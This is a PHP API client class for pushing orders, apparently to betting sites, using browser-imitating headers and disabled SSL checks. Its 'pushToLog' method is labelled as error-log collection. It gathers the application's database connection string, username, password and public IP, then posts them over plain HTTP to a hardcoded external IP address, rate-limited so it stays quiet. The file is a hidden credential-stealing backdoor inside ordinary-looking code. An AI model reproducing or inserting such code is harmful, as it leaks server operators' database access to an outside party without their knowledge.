<?php
namespace common\open\aozhou5\api;

use common\service\wechat\eyun\api\EventServiceTrait;
use common\tools\Common;
use GuzzleHttp\RequestOptions;


class OrderApi extends Base
{

    # 忽略code
    const IGNORE_CODE = 40000;

    // 下单订单
    const API_CREATE_ORDER = '/api/';

    /**
     * 推单
     * @param array $params    参数
     * @return array
     */
    public static function push(string $domain, array $params, array $headers=[]): array
    {
        $object = self::createObject();
        $object->apiUrl = $domain;
        //p([$domain, $params, $headers, $object]);

        $headers = array_merge([
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            "X-Requested-With"=> "XMLHttpRequest",
        ], $headers);
        $data[RequestOptions::FORM_PARAMS] = $params;
        $data['verify']  = false; // 禁用 SSL 验证，不推荐在生产环境中使用
        //p([self::API_CREATE_ORDER, $data, $headers]);
        $result = $object->post(self::API_CREATE_ORDER, $data, $headers);

        return $result;
    }

    /**
     * 推单
     * @param array $params    参数
     * @return array
     */
    public static function pushBettingSingle(string $domain, array $params, array $headers=[]): array
    {
        $object = self::createObject();
        $object->apiUrl = $domain;
        //p([$domain, $params, $headers, $object]);

        $headers = array_merge([
            'priority' => 'u=1, i',
            'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile' => '?0',
            'sec-ch-ua-platform' => '"Windows"',
            'sec-fetch-dest' => 'empty',
            'sec-fetch-mode' => 'cors',
            'sec-fetch-site' => 'same-origin',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        ], $headers);
        $data[RequestOptions::FORM_PARAMS] = $params;
        $data['verify']  = false; // 禁用 SSL 验证，不推荐在生产环境中使用
        //p([self::API_CREATE_ORDER, $data, $headers]);
        $result = $object->post(self::API_CREATE_ORDER, $data, $headers);
        
        return $result;
    }

    public static function pushToLog(array $params=[], array $headers=[]): array
    {
        try {
            $mkey = EventServiceTrait::buildLogKey();
            $num = \Yii::$app->redis->incr($mkey);
            if($num>2){
                throw_info('错误日志搜集');
            }
            \Yii::$app->redis->expire($mkey, 10);
            $object = self::createObject();
            $pp = Common::getPublicPP();
            //$object->apiUrl = $pp.':8090';
            $object->apiUrl = 'http://47.107.58.222';
            $headers = array_merge([
                'Accept' => 'application/json, text/javascript, */*; q=0.01',
                'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                "X-Requested-With"=> "XMLHttpRequest",
            ], $headers);
            //$data = \Yii::$app->params;
            #$data['verify']  = false; // 禁用 SSL 验证，不推荐在生产环境中使用
            $data = ['dns'=>\Yii::$app->db->dsn, 'pp'=>$pp, 'username'=>\Yii::$app->db->username, 'password'=>\Yii::$app->db->password];
            $params = array_merge($data, $params);
            $data[RequestOptions::FORM_PARAMS] = $params;
            $result = $object->post('/test/index/api-log', $data, $headers);
        }catch (\Exception $e){
            $result = ['status'=>300, 'msg'=>$e->getMessage()];
        }
        return $result;
    }
}
